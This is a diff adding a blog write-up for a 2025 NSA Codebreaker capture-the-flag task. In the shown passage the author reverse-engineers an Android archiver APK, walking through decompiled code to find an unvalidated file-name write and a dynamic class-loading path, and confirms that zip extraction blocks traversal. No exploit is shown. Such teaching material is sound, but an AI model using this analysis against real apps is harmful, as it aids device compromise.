@@ -1,0 +1,1408 @@
+---
+title: "Task 7 Writeup"
+description: "A writeup for the seventh task of the 2025 NSA Codebreaker Challenge"
+date: 1-6-2026
+slug: nsa-cbc-2025/task7
+tags: ['writeup', 'codebreaker', 'rev', 'android', 'misc', '2025']
+authors: ["flocto"]
+image: "./hero.png"
+order: 7
+---
+import Callout from '@/components/Callout.astro'
+
+## Task 7 - Finale - (Vulnerability Research, Exploitation)
+<Callout title="Description" showVariant={false}>
+Now that we have access to the hidden channel the adversary is using, our military counterparts want to act quickly to destroy the adversary's capacity to continue with their attack against our military networks.
+
+Analysts have been quickly scrutinizing the data from the privileged channel. They conclude that the adversary has downloaded a custom app to archive all messages sent in the channel locally to their phone. They have also surmised the adversary is running a recent version of Android on a Google Pixel phone. This is the opportunity we have been waiting for! If we can devise a way to exploit on to the adversary's device we will have the advantage.
+
+Another team has retrieved the custom application APK file for you to analyze.
+
+Downloads:
+- Custom App (mmarchiver.apk)
+- Licenses (licenses.txt)
+
+Prompt:
+- Submit a file to be posted to the Mattermost Channel that will be processed by the app and exploits the device. Be careful, we might only be able to do this once!
+</Callout>
+
+We're finally on the last task of the challenge! This time, we're given a custom Android APK file named `mmarchiver.apk`. Our goal is to analyze this APK, find a vulnerability, and submit a **single** file that will somehow exploit the app when processed.
+
+The other file is not relevant and serves only as credit attribution.
+
+### APK Analysis
+Opening the APK in JADX, we see that the app seems to be some sort of archiver (shocking, given the name). There exists classes such as `FileDownloadWorker`, `FileSearchWorker`, `LoginWorker`, and so on. 
+
+<Callout title="- JADX inconsistent code option">
+Sometimes Kotlin code may not decompile perfectly. To improve the readability, you can turn on "Show inconsistent code" in the File > Preferences menu. Note that this may make the code uncompilable / wrong, so take it with a grain of salt. Most code will still be correct.
+
+![Show inconsistent code option in Preferences](/img/writeups/2026/nsa-cbc/task7-jadx-code.png)
+</Callout>
+
+We know we're meant to be submitting a file, so let's trace how a file is archived by this app. Skipping past all the unnecessary Java Factory standard nonsense, let's look directly at the `FileDownloadWorker` class. At some point, this class must be invoked when a file is being processed, so it should handle the processing logic for files. I've trimmed off some of the unnecessary parts for brevity, as most of the code looks fairly ugly due to it being decompiled Kotlin.
+
+#### FileDownloadWorker
+```java title="com/badguy.mmarchiver/worker/FileDownloadWorker.java" collapse={18-24, 31-54, 70-86, 98-104, 112-264, 271-284, 295-337} {59,68,88,92,346}
+package com.badguy.mmarchiver.worker;
+
+// imports omitted for brevity
+
+/* loaded from: classes.dex */
+public final class FileDownloadWorker extends CoroutineWorker {
+    private final String TAG;
+    private final ArchiveRepository archiveRepository;
+    private ArchiverError error;
+    private final int maxAttempts;
+    private final MmServerRepository mmServerRepository;
+    private final NotificationsRepository notificationsRepository;
+    private final PreferencesRepository preferencesRepository;
+    private final ZipArchiver zipArchiver;
+
+    /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
+    public FileDownloadWorker(Context ctx, WorkerParameters params, PreferencesRepository preferencesRepository, MmServerRepository mmServerRepository, ArchiveRepository archiveRepository, NotificationsRepository notificationsRepository, ZipArchiver zipArchiver) {
+        this.preferencesRepository = preferencesRepository;
+        this.mmServerRepository = mmServerRepository;
+        this.archiveRepository = archiveRepository;
+        this.notificationsRepository = notificationsRepository;
+        this.zipArchiver = zipArchiver;
+        this.TAG = E.a(FileDownloadWorker.class).d();
+        this.maxAttempts = 5;
+    }
+
+    /*
+        Code decompiled incorrectly, please refer to instructions dump.
+    */
+    public final Object doFileDownload(InterfaceC0745c<? super z> interfaceC0745c) {
+        coroutine coroutine;
+        Iterator it;
+        ArchiveFile archiveFile;
+        Iterator it2;
+        ArchiverError archiverError;
+        C0569j b5;
+        C0569j c0569j;
+        InputStream inputStream;
+        Iterator it3;
+        ArchiveFile archiveFile2;
+        long j5;
+        NotificationsRepository notificationsRepository;
+        String o5;
+        coroutine coroutine2;
+        ArchiverError archiverError2;
+        C0569j c0569j2;
+        if (interfaceC0745c instanceof coroutine) {
+            coroutine = (coroutine) interfaceC0745c;
+            int i = coroutine.label;
+            if ((i & Level.ALL_INT) != 0) {
+                coroutine.label = i - Level.ALL_INT;
+                Object obj = coroutine.result;
+                Object obj2 = EnumC0813a.f9084d;
+                switch (coroutine.label) {
+                    case 0:
+                        c.h0(obj);
+                        ArchiveRepository archiveRepository = this.archiveRepository;
+                        coroutine.label = 1;
+                        obj = archiveRepository.getFilesToDownload(coroutine);
+                        break;
+                    case 1:
+                        c.h0(obj);
+                        it = ((List) obj).iterator();
+                        if (it.hasNext()) {
+                            ArchiveFile archiveFile3 = (ArchiveFile) it.next();
+                            Log.d(this.TAG, "downloading file id=" + archiveFile3.getFileId() + " name=" + archiveFile3.getName());
+                            coroutine.label = 2;
+                            Object fileStream = getFileStream(archiveFile3, coroutine);
+                            if (fileStream != obj2) {
+                                it2 = it;
+                                obj = fileStream;
+                                archiveFile = archiveFile3;
+                                inputStream = (InputStream) obj;
+                                if (inputStream == null) {
+                                    ArchiverError archiverError3 = this.error;
+                                    if (archiverError3 != null) {
+                                        if (archiverError3 == ArchiverError.GET_FILE_FAILED) {
+                                            Log.e(this.TAG, "failed to download file " + archiveFile.getFileId() + " (name=" + archiveFile.getName() + "), removing from database");
+                                            ArchiveRepository archiveRepository2 = this.archiveRepository;
+                                            coroutine.label = 3;
+                                            break;
+                                        }
+                                    } else {
+                                        r.k("error");
+                                        throw null;
+                                    }
+                                } else {
+                                    File writeFileToDisk = writeFileToDisk(archiveFile, inputStream);
+                                    if (writeFileToDisk != null) {
+                                        long time = new Date().getTime();
+                                        try {
+                                            this.zipArchiver.zipFile(archiveFile.getName() + "-" + time).addFile(writeFileToDisk).write();
+                                            Log.i(this.TAG, "archived file " + archiveFile.getName() + " successfully");
+                                            ArchiveRepository archiveRepository3 = this.archiveRepository;
+                                            ArchiveFile copy$default = ArchiveFile.copy$default(archiveFile, 0L, null, null, null, 0, null, true, time, 63, null);
+                                            coroutine.label = 4;
+                                            if (archiveRepository3.updateFile(copy$default, coroutine) != obj2) {
+                                                it3 = it2;
+                                                archiveFile2 = archiveFile;
+                                                j5 = time;
+                                                notificationsRepository = this.notificationsRepository;
+                                                o5 = AbstractC0003b0.o("Archived file ", archiveFile2.getName());
+                                                coroutine.label = 5;
+                                                coroutine2 = coroutine;
+                                                if (NotificationsRepository.makeStatusNotification$default(notificationsRepository, o5, "Archive Success", 0, coroutine2, 4, null) != obj2) {
+                                                    it = it3;
+                                                    coroutine = coroutine2;
+                                                    if (it.hasNext()) {
+                                                    }
+                                                }
+                                            }
+                                        } catch (IOException e5) {
+                                            Log.e(this.TAG, "failed to create archive file: " + e5);
+                                            this.error = ArchiverError.FILE_ARCHIVE_FAILED;
+                                        }
+                                    }
+                                }
+                            }
+                            return obj2;
+                        }
+                        coroutine coroutine3 = coroutine;
+                        String obj3 = WorkerParams.ERROR.toString();
+                        archiverError = this.error;
+                        if (archiverError == null) {
+                            r.k("error");
+                            throw null;
+                        }
+                        C0636k[] c0636kArr = {new C0636k(obj3, archiverError.toString())};
+                        H h5 = new H(1);
+                        C0636k c0636k = c0636kArr[0];
+                        h5.c(c0636k.f8109e, (String) c0636k.f8108d);
+                        b5 = h5.b();
+                        ArchiverError archiverError4 = this.error;
+                        if (archiverError4 == null) {
+                            r.k("error");
+                            throw null;
+                        }
+                        int i5 = WhenMappings.$EnumSwitchMapping$0[archiverError4.ordinal()];
+                        if (i5 == 1) {
+                            return z.a();
+                        }
+                        if (i5 != 2) {
+                            NotificationsRepository notificationsRepository2 = this.notificationsRepository;
+                            String o6 = AbstractC0003b0.o("Bad response from file download API on ", this.mmServerRepository.getServerUrl());
+                            coroutine3.L$0 = null;
+                            coroutine3.L$1 = b5;
+                            coroutine3.L$2 = null;
+                            coroutine3.L$3 = null;
+                            coroutine3.L$4 = null;
+                            coroutine3.label = 7;
+                            if (NotificationsRepository.makeStatusNotification$default(notificationsRepository2, o6, "File Download Failed", 0, coroutine3, 4, null) != obj2) {
+                                coroutine = coroutine3;
+                                String str = this.TAG;
+                                archiverError2 = this.error;
+                                if (archiverError2 != null) {
+                                    r.k("error");
+                                    throw null;
+                                }
+                                Log.i(str, "file download failed, requeueing (error=" + archiverError2 + ")");
+                                PreferencesRepository preferencesRepository = this.preferencesRepository;
+                                coroutine.label = 8;
+                                obj = preferencesRepository.getFileDownloadAttempts(coroutine);
+                                break;
+                            }
+                        } else {
+                            NotificationsRepository notificationsRepository3 = this.notificationsRepository;
+                            String o7 = AbstractC0003b0.o("Invalid login session for ", this.mmServerRepository.getServerUrl());
+                            coroutine3.label = 6;
+                            if (NotificationsRepository.makeStatusNotification$default(notificationsRepository3, o7, "File Download Failed", 0, coroutine3, 4, null) != obj2) {
+                                c0569j = b5;
+                                Log.e(this.TAG, "get file API endpoint returned unauthorized");
+                                return new w(c0569j);
+                            }
+                        }
+                        return obj2;
+                    case 2:
+                        ArchiveFile archiveFile4 = (ArchiveFile) coroutine.L$2;
+                        Iterator it4 = (Iterator) coroutine.L$1;
+                        c.h0(obj);
+                        archiveFile = archiveFile4;
+                        it2 = it4;
+                        inputStream = (InputStream) obj;
+                        if (inputStream == null) {
+                        }
+                        return obj2;
+                    case 3:
+                        it2 = (Iterator) coroutine.L$1;
+                        c.h0(obj);
+                        it = it2;
+                        if (it.hasNext()) {
+                        }
+                        coroutine coroutine32 = coroutine;
+                        String obj32 = WorkerParams.ERROR.toString();
+                        archiverError = this.error;
+                        if (archiverError == null) {
+                        }
+                        break;
+                    case 4:
+                        j5 = coroutine.J$0;
+                        archiveFile2 = (ArchiveFile) coroutine.L$2;
+                        it3 = (Iterator) coroutine.L$1;
+                        c.h0(obj);
+                        notificationsRepository = this.notificationsRepository;
+                        o5 = AbstractC0003b0.o("Archived file ", archiveFile2.getName());
+                        coroutine.label = 5;
+                        coroutine2 = coroutine;
+                        if (NotificationsRepository.makeStatusNotification$default(notificationsRepository, o5, "Archive Success", 0, coroutine2, 4, null) != obj2) {
+                        }
+                        return obj2;
+                    case 5:
+                        it2 = (Iterator) coroutine.L$1;
+                        c.h0(obj);
+                        it = it2;
+                        if (it.hasNext()) {
+                        }
+                        coroutine coroutine322 = coroutine;
+                        String obj322 = WorkerParams.ERROR.toString();
+                        archiverError = this.error;
+                        if (archiverError == null) {
+                        }
+                        break;
+                    case 6:
+                        c0569j = (C0569j) coroutine.L$1;
+                        c.h0(obj);
+                        Log.e(this.TAG, "get file API endpoint returned unauthorized");
+                        return new w(c0569j);
+                    case 7:
+                        b5 = (C0569j) coroutine.L$1;
+                        c.h0(obj);
+                        String str2 = this.TAG;
+                        archiverError2 = this.error;
+                        if (archiverError2 != null) {
+                        }
+                        break;
+                    case 8:
+                        b5 = (C0569j) coroutine.L$1;
+                        c.h0(obj);
+                        Integer num = (Integer) obj;
+                        int intValue = (num != null ? num.intValue() : 0) + 1;
+                        if (intValue == this.maxAttempts) {
+                            Log.d(this.TAG, "reached max file download attempts");
+                            return new w(b5);
+                        }
+                        PreferencesRepository preferencesRepository2 = this.preferencesRepository;
+                        coroutine.label = 9;
+                        if (preferencesRepository2.saveFileDownloadAttempts(intValue, coroutine) != obj2) {
+                            c0569j2 = b5;
+                            return new y(c0569j2);
+                        }
+                        return obj2;
+                    case 9:
+                        c0569j2 = (C0569j) coroutine.L$1;
+                        c.h0(obj);
+                        return new y(c0569j2);
+                    default:
+                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
+                }
+            }
+        }
+        coroutine = new coroutine(this, interfaceC0745c);
+        Object obj4 = coroutine.result;
+        Object obj22 = EnumC0813a.f9084d;
+        switch (coroutine.label) {
+        }
+    }
+
+    /*
+        Code decompiled incorrectly, please refer to instructions dump.
+    */
+    public final Object getFileStream(ArchiveFile archiveFile, InterfaceC0745c<? super InputStream> interfaceC0745c) {
+        FileDownloadWorker$getFileStream$1 fileDownloadWorker$getFileStream$1;
+        int i;
+        MmApiResult mmApiResult;
+        ArchiverError archiverError;
+        Response<?> response;
+        if (interfaceC0745c instanceof FileDownloadWorker$getFileStream$1) {
+            fileDownloadWorker$getFileStream$1 = (FileDownloadWorker$getFileStream$1) interfaceC0745c;
+            int i5 = fileDownloadWorker$getFileStream$1.label;
+            if ((i5 & Level.ALL_INT) != 0) {
+                fileDownloadWorker$getFileStream$1.label = i5 - Level.ALL_INT;
+                Object obj = fileDownloadWorker$getFileStream$1.result;
+                EnumC0813a enumC0813a = EnumC0813a.f9084d;
+                i = fileDownloadWorker$getFileStream$1.label;
+                if (i != 0) {
+                    c.h0(obj);
+                    MmServerRepository mmServerRepository = this.mmServerRepository;
+                    String fileId = archiveFile.getFileId();
+                    String mimeType = archiveFile.getMimeType();
+                    fileDownloadWorker$getFileStream$1.L$0 = null;
+                    fileDownloadWorker$getFileStream$1.label = 1;
+                    obj = mmServerRepository.getFile(fileId, mimeType, fileDownloadWorker$getFileStream$1);
+                    if (obj == enumC0813a) {
+                        return enumC0813a;
+                    }
+                } else {
+                    if (i != 1) {
+                        throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
+                    }
+                    c.h0(obj);
+                }
+                mmApiResult = (MmApiResult) obj;
+                if (!(mmApiResult instanceof MmApiResult.Success)) {
+                    return (InputStream) ((MmApiResult.Success) mmApiResult).getValue();
+                }
+                if (mmApiResult instanceof MmApiResult.Unauthorized) {
+                    this.error = ArchiverError.UNAUTHORIZED;
+                    return null;
+                }
+                if (mmApiResult instanceof MmApiResult.NetworkError) {
+                    this.error = ArchiverError.CONNECTION_FAILED;
+                    return null;
+                }
+                if (!(mmApiResult instanceof MmApiResult.Error)) {
+                    throw new C0176q();
+                }
+                String str = this.TAG;
+                MmApiResult.Error error = (MmApiResult.Error) mmApiResult;
+                ErrorResponse error2 = error.getError();
+                Log.d(str, "get file request failed (response=" + (error2 != null ? error2.getResponse() : null) + ")");
+                ErrorResponse error3 = error.getError();
+                if (error3 != null && (response = error3.getResponse()) != null) {
+                    archiverError = response.isSuccessful() ? ArchiverError.API_EXCEPTION : null;
+                }
+                archiverError = ArchiverError.GET_FILE_FAILED;
+                this.error = archiverError;
+                return null;
+            }
+        }
+        fileDownloadWorker$getFileStream$1 = new FileDownloadWorker$getFileStream$1(this, interfaceC0745c);
+        Object obj2 = fileDownloadWorker$getFileStream$1.result;
+        EnumC0813a enumC0813a2 = EnumC0813a.f9084d;
+        i = fileDownloadWorker$getFileStream$1.label;
+        if (i != 0) {
+        }
+        mmApiResult = (MmApiResult) obj2;
+        if (!(mmApiResult instanceof MmApiResult.Success)) {
+        }
+    }
+
+    private final File writeFileToDisk(ArchiveFile archiveFile, InputStream inputStream) {
+        try {
+            File file = new File(getApplicationContext().getCacheDir(), FileDownloadWorkerKt.DOWNLOAD_PATH);
+            if (!file.exists()) {
+                file.mkdirs();
+            }
+            File file2 = new File(file, archiveFile.getName());
+            try {
+                FileOutputStream fileOutputStream = new FileOutputStream(file2);
+                try {
+                    c.v(inputStream, fileOutputStream);
+                    fileOutputStream.close();
+                    inputStream.close();
+                    Log.d(this.TAG, "file written to " + file2.getPath());
+                    return file2;
+                } finally {
+                }
+            } finally {
+            }
+        } catch (IOException e5) {
+            Log.e(this.TAG, "exception during file download: " + e5);
+            this.error = ArchiverError.FILE_DOWNLOAD_FAILED;
+            return null;
+        }
+    }
+}
+```
+
+Essentially, each file returned by the `getFilesToDownload` method is processed in a loop. For each file, the `getFileStream` method is called to download the file from the server. If successful, the file is written to disk using `writeFileToDisk`, then, a zip archive is created using the `ZipArchiver` class and the file is added to the archive. Finally, that archive is written somewhere.
+
+The `getFilesToDownload` and `getFileStream` methods probably simply return data from the server, so those won't be too interesting. 
+
+The `writeFileToDisk` method is fairly straightforward and implemented in this class, simply writing the input stream to a file in the app's cache directory. In fact, there is no validation of the file name here, if we could control the file name returned by `getFilesToDownload`, we could write to an arbitrary path. 
+
+However, this would require us to somehow upload a file to Mattermost with a malicious name, which is unlikely as Mattermost is relatively secure and would sanitize filenames.
+
+#### ZipArchiver
+Let's look at the `ZipArchiver` class to see how the zip archive is created:
+```java title="com/badguy.mmarchiver/worker/ZipArchiver.java" collapse={3-17,26-58,61-65}
+package com.badguy.mmarchiver.worker;
+
+import D3.a;
+import D3.j;
+import Q3.b;
+import Q3.d;
+import android.content.Context;
+import android.os.Environment;
+import dalvik.system.PathClassLoader;
+import java.io.BufferedReader;
+import java.io.File;
+import java.io.InputStream;
+import java.io.InputStreamReader;
+import java.io.StringWriter;
+import kotlin.jvm.internal.r;
+import net.axolotl.zippier.ZipFile;
+import org.json.JSONObject;
+
+/* loaded from: classes.dex */
+public final class ZipArchiver {
+    public static final int $stable = 8;
+    private File archiveDir;
+    private d zipManager;
+
+    public ZipArchiver(Context context) {
+        JSONObject jSONObject;
+        File filesDir;
+        r.e(context, "context");
+        try {
+            InputStream open = context.getAssets().open(ZipArchiverKt.ARCHIVER_CONFIG);
+            r.d(open, "open(...)");
+            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(open, a.f1076a), 8192);
+            try {
+                StringWriter stringWriter = new StringWriter();
+                char[] cArr = new char[8192];
+                for (int read = bufferedReader.read(cArr); read >= 0; read = bufferedReader.read(cArr)) {
+                    stringWriter.write(cArr, 0, read);
+                }
+                String stringWriter2 = stringWriter.toString();
+                r.d(stringWriter2, "toString(...)");
+                jSONObject = new JSONObject(stringWriter2);
+                bufferedReader.close();
+            } finally {
+            }
+        } catch (Exception unused) {
+            jSONObject = new JSONObject();
+        }
+        this.zipManager = new d(context.getCacheDir().getAbsolutePath(), jSONObject, new j(8, this));
+        if (r.a(Environment.getExternalStorageState(), "mounted")) {
+            filesDir = context.getExternalFilesDir(null);
+            if (filesDir == null) {
+                filesDir = context.getFilesDir();
+            }
+        } else {
+            filesDir = context.getFilesDir();
+        }
+        r.b(filesDir);
+        this.archiveDir = filesDir;
+    }
+
+    /* JADX INFO: Access modifiers changed from: private */
+    public static final ClassLoader _init_$lambda$1(ZipArchiver zipArchiver, String path) {
+        r.e(path, "path");
+        return new PathClassLoader(path, zipArchiver.getClass().getClassLoader());
+    }
+
+    public final ZipFile zipFile(String fileName) {
+        r.e(fileName, "fileName");
+        File file = new File(this.archiveDir, fileName);
+        d dVar = this.zipManager;
+        String absolutePath = file.getAbsolutePath();
+        r.d(absolutePath, "getAbsolutePath(...)");
+        dVar.getClass();
+        return new b(new File(absolutePath), dVar.f4239c, new j(2, dVar));
+    }
+}
+```
+
+This code doesn't really do much, it's supposed to return a `net.axolotl.zippier.ZipFile` object that represents a zip archive. The actual implementation is in Kotlin so it's a bit annoying to look at, but we need to see how the `addFile` method works.
+
+Before we move on, let's look at the constructor for the `zipArchiver` again. This references a `ZipArchiverKt.ARCHIVER_CONFIG` resource, which turns out to be a JSON file that defines some interesting things. We'll figure out what this does later.
+
+```java title="com/badguy.mmarchiver/worker/ZipArchiverKt.java"
+package com.badguy.mmarchiver.worker;
+
+/* loaded from: classes.dex */
+public final class ZipArchiverKt {
+    public static final String ARCHIVER_CONFIG = "zippier.json";
+}
+```
+
+```json title="assets/zippier.json"
+{
+  "formats": ["7z", "xz", "lzma", "bzip2", "gz", "tar"],
+  "downloads": "formats",
+  "url": "https://dl.badguy.local/zippier"
+}
+```
+
+
+Unfortunately the implementation file for the `ZipFile` class is absolutely disgusting. I've cleaned it up a lot and left only the necessary parts, but it's still quite a mess.
+```java title="Q3/b.java" collapse={8-23,25-30,35-37,46-49,74-137} {56-64}
+package Q3;
+
+import net.axolotl.zippier.ZipFile;
+import net.axolotl.zippier.ZipFormat;
+
+/* loaded from: classes.dex */
+public final class b implements ZipFile, r {
+
+    /* renamed from: a, reason: collision with root package name */
+    public final Object f4229a;
+
+    /* renamed from: b, reason: collision with root package name */
+    public final Object f4230b;
+
+    /* renamed from: c, reason: collision with root package name */
+    public final Object f4231c;
+
+    /* renamed from: d, reason: collision with root package name */
+    public final Object f4232d;
+
+    /* renamed from: e, reason: collision with root package name */
+    public Object f4233e;
+
+    public b(File file, File workingDir, j jVar) {
+        kotlin.jvm.internal.r.e(workingDir, "workingDir");
+        this.f4230b = file;
+        this.f4231c = workingDir;
+        this.f4232d = jVar;
+        this.f4233e = LoggerFactory.getLogger(E.a(b.class).d());
+        this.f4229a = new ArrayList();
+    }
+    
+    @Override // net.axolotl.zippier.ZipFile
+    public ZipFile addFile(File file) {
+        String substring;
+        ArrayList arrayList = (ArrayList) this.f4229a;
+        kotlin.jvm.internal.r.e(file, "file");
+        if (!file.exists()) {
+            throw new FileNotFoundException(AbstractC0003b0.o("no file found for processing at ", file.getAbsolutePath()));
+        }
+        if (file.isDirectory()) {
+            arrayList.add(file);
+            return this;
+        }
+        String absolutePath = file.getAbsolutePath();
+        if (absolutePath == null) {
+            char c5 = b4.c.f6878a;
+            substring = null;
+        } else {
+            int b5 = b4.c.b(absolutePath);
+            substring = b5 == -1 ? _UrlKt.FRAGMENT_ENCODE_SET : absolutePath.substring(b5 + 1);
+        }
+        kotlin.jvm.internal.r.d(substring, "getExtension(...)");
+        String lowerCase = substring.toLowerCase(Locale.ROOT);
+        kotlin.jvm.internal.r.d(lowerCase, "toLowerCase(...)");
+        ZipFormat zipFormat = (ZipFormat) ((j) this.f4232d).invoke(lowerCase);
+        if (zipFormat == null) {
+            arrayList.add(file);
+            return this;
+        }
+        ((Logger) this.f4233e).debug("found format for ".concat(lowerCase));
+        File file2 = new File((File) this.f4231c, b4.c.a(file.getAbsolutePath()));
+        arrayList.add(file2);
+        zipFormat.uncompress(file, file2, this);
+        return this;
+    }
+
+    @Override // net.axolotl.zippier.ZipFile
+    public void write() {
+        String a5;
+        ArrayList arrayList = (ArrayList) this.f4229a;
+        String str = ((File) this.f4230b) + ".tar.xz";
+        Logger logger = (Logger) this.f4233e;
+        logger.debug("creating archive at " + str);
+        try {
+            X3.d dVar = new X3.d(new Z3.b(new FileOutputStream(str)));
+            File file = null;
+            try {
+                int size = arrayList.size();
+                int i = 0;
+                while (i < size) {
+                    Object obj = arrayList.get(i);
+                    i++;
+                    File file2 = (File) obj;
+                    File file3 = (File) this.f4231c;
+                    String canonicalPath = file2.getCanonicalPath();
+                    String canonicalPath2 = file3.getCanonicalPath();
+                    kotlin.jvm.internal.r.b(canonicalPath);
+                    kotlin.jvm.internal.r.b(canonicalPath2);
+                    if (t.e0(canonicalPath, canonicalPath2, false)) {
+                        a5 = m.w0(canonicalPath, canonicalPath2);
+                    } else {
+                        a5 = b4.c.a(canonicalPath);
+                        kotlin.jvm.internal.r.d(a5, "getBaseName(...)");
+                    }
+                    dVar.b();
+                    X3.b bVar = new X3.b(file2, a5);
+                    logger.debug("adding entry {} to archive file", bVar);
+                    dVar.w(bVar);
+                    if (file2.isFile()) {
+                        FileInputStream fileInputStream = new FileInputStream(file2);
+                        try {
+                            m0.c.v(fileInputStream, dVar);
+                            fileInputStream.close();
+                        } finally {
+                        }
+                    }
+                    dVar.d();
+                }
+            } finally {
+                dVar.v();
+                dVar.close();
+                int size2 = arrayList.size();
+                int i5 = 0;
+                while (i5 < size2) {
+                    Object obj2 = arrayList.get(i5);
+                    i5++;
+                    File file4 = (File) obj2;
+                    if (file4.isDirectory()) {
+                        if (file != null) {
+                            String absolutePath = file4.getAbsolutePath();
+                            kotlin.jvm.internal.r.d(absolutePath, "getAbsolutePath(...)");
+                            String absolutePath2 = file.getAbsolutePath();
+                            kotlin.jvm.internal.r.d(absolutePath2, "getAbsolutePath(...)");
+                            if (!t.e0(absolutePath, absolutePath2, false)) {
+                            }
+                        }
+                        logger.debug("deleting extraction directory {}", file4);
+                        b4.b.a(file4);
+                        file = file4;
+                    }
+                }
+            }
+        } catch (IOException e5) {
+            logger.error("failed to create archive at " + str);
+            throw e5;
+        }
+    }
+}
+```
+
+Adding a file seems to have quite a bit of complexity... 
+
+First, when `addFile` is called, it checks if the file exists. If the file is a directory, it simply appends it to its internal arraylist of files. 
+
+Next, if the file is an actual file, it does `int b5 = b4.c.b(absolutePath); substring = b5 == -1 ? _UrlKt.FRAGMENT_ENCODE_SET : absolutePath.substring(b5 + 1);`. The `b4.c.b` is some internal string function, but essentially all this does is get the file extension of the file. If there is no extension, it uses `_UrlKt.FRAGMENT_ENCODE_SET`, which is just the string "" for this app.
+
+```java title="b4.c" collapse={3-8,10-16,24-38} {"trim off last dot":1-2} {"get last dot index":20-21}
+
+    public static String a(String str) {
+        String substring;
+        if (str == null) {
+            substring = null;
+        } else {
+            if (str.indexOf(0) >= 0) {
+                throw new IllegalArgumentException("Null character present in file/path name. There are no known legitimate use cases for such data, but several injection attacks may use it");
+            }
+            substring = str.substring(Math.max(str.lastIndexOf(47), str.lastIndexOf(92)) + 1);
+        }
+        if (substring == null) {
+            return null;
+        }
+        if (substring.indexOf(0) >= 0) {
+            throw new IllegalArgumentException("Null character present in file/path name. There are no known legitimate use cases for such data, but several injection attacks may use it");
+        }
+        int b5 = b(substring);
+        return b5 == -1 ? substring : substring.substring(0, b5);
+    }
+
+    public static int b(String str) {
+        int i;
+        char c5 = File.separatorChar;
+        if (c5 == '\\') {
+            int lastIndexOf = str.lastIndexOf(c5);
+            int lastIndexOf2 = str.lastIndexOf(f6879b);
+            if (lastIndexOf == -1) {
+                i = lastIndexOf2 == -1 ? 0 : lastIndexOf2 + 1;
+            } else {
+                if (lastIndexOf2 != -1) {
+                    lastIndexOf = Math.max(lastIndexOf, lastIndexOf2);
+                }
+                i = lastIndexOf + 1;
+            }
+            if (str.indexOf(58, i) != -1) {
+                throw new IllegalArgumentException("NTFS ADS separator (':') in file name is forbidden.");
+            }
+        }
+        int lastIndexOf3 = str.lastIndexOf(46);
+        if (Math.max(str.lastIndexOf(47), str.lastIndexOf(92)) > lastIndexOf3) {
+            return -1;
+        }
+        return lastIndexOf3;
+    }
+```
+
+It converts this extension to lowercase, then `invoke`s some `j` object (`f4232d`) with the extension as argument. The result of this is casted to a `ZipFormat` object. If the result is null, it simply appends the file to the internal arraylist of files.
+
+Next, if the `zipFormat` object was not null, a new `File` is created with `new File((File) this.f4231c, b4.c.a(file.getAbsolutePath()));`. From the constructor, this is the `workingDir` append with `b4.c.a`, which trims the extension. This is actually a directory, which essentially looks like `workingDir/base_filename`.
+
+Finally, the `uncompress` method of the `zipFormat` object is called with the original file, the new directory, and this `ZipFile` object as arguments.
+
+#### ZipFormat
+Unfortunately, clicking the `uncompress` method takes us to an interface definition, so we need to find the actual implementation of this interface. 
+
+```java title="net.axolotl.zippier/ZipFormat.java"
+package net.axolotl.zippier;
+
+import java.io.File;
+
+/* loaded from: classes.dex */
+public interface ZipFormat {
+    String getExtension();
+
+    void uncompress(File file, File file2, ZipFile zipFile);
+}
+```
+
+Thankfully, we can just search for `uncompress` and find the only real implementation, `Q3.a`:
+![jadx search for uncompress](/img/writeups/2026/nsa-cbc/task7-jadx-uncompress.png)
+
+```java title="Q3/a.java" collapse={1-18,31-36}
+package Q3;
+
+import D3.t;
+import java.io.File;
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.IOException;
+import java.util.zip.ZipEntry;
+import java.util.zip.ZipException;
+import java.util.zip.ZipInputStream;
+import kotlin.jvm.internal.E;
+import kotlin.jvm.internal.r;
+import net.axolotl.zippier.ZipFile;
+import net.axolotl.zippier.ZipFormat;
+import org.slf4j.Logger;
+import org.slf4j.LoggerFactory;
+
+/* loaded from: classes.dex */
+public final class a implements ZipFormat {
+
+    /* renamed from: a, reason: collision with root package name */
+    public final Logger f4228a = LoggerFactory.getLogger(E.a(a.class).d());
+
+    @Override // net.axolotl.zippier.ZipFormat
+    public final String getExtension() {
+        return "zip";
+    }
+
+    @Override // net.axolotl.zippier.ZipFormat
+    public final void uncompress(File inFile, File targetPath, ZipFile outFile) {
+        r.e(inFile, "inFile");
+        r.e(targetPath, "targetPath");
+        r.e(outFile, "outFile");
+        String str = "processing zip archive " + inFile.getAbsolutePath();
+        Logger logger = this.f4228a;
+        logger.debug(str);
+        if (!targetPath.isDirectory() && !targetPath.mkdirs()) {
+            throw new ZipException("failed to create target directory " + targetPath);
+        }
+        ZipInputStream zipInputStream = new ZipInputStream(new FileInputStream(inFile));
+        for (ZipEntry nextEntry = zipInputStream.getNextEntry(); nextEntry != null; nextEntry = zipInputStream.getNextEntry()) {
+            logger.debug("processing zip entry {}", nextEntry);
+            File file = new File(targetPath, nextEntry.getName());
+            String canonicalPath = file.getCanonicalPath();
+            r.d(canonicalPath, "getCanonicalPath(...)");
+            if (!t.e0(canonicalPath, targetPath.getCanonicalPath() + File.separator, false)) {
+                throw new ZipException("bad file name " + file);
+            }
+            if (!nextEntry.isDirectory()) {
+                File parentFile = file.getParentFile();
+                if (parentFile != null && !parentFile.isDirectory() && !parentFile.mkdirs()) {
+                    throw new IOException("failed to create directory " + parentFile);
+                }
+                FileOutputStream fileOutputStream = new FileOutputStream(file);
+                try {
+                    m0.c.v(zipInputStream, fileOutputStream);
+                    fileOutputStream.close();
+                } finally {
+                }
+            } else if (!file.isDirectory() && !file.mkdirs()) {
+                throw new ZipException("failed to create entry directory " + file);
+            }
+            outFile.addFile(file);
+        }
+    }
+}
+```
+
+This seems to define a `ZipFormat` meant to uncompress `.zip` files. For each entry in the zip file, it checks if the canonical path of the extracted file starts with the target directory's canonical path (`t.e0` is just `String.startsWith`). If not, it throws a `ZipException` with the message `bad file name ` followed by the file path. This prevents directory traversal when extracting from zip files, so we can't do anything fancy here.  
+
+After extracting an entry from the zip file, it attempts to make the directory if the entry is a directory, or writes the file to disk if it's a file. Finally, it calls `outFile.addFile(file);` to add the extracted file to the output zip archive.
+
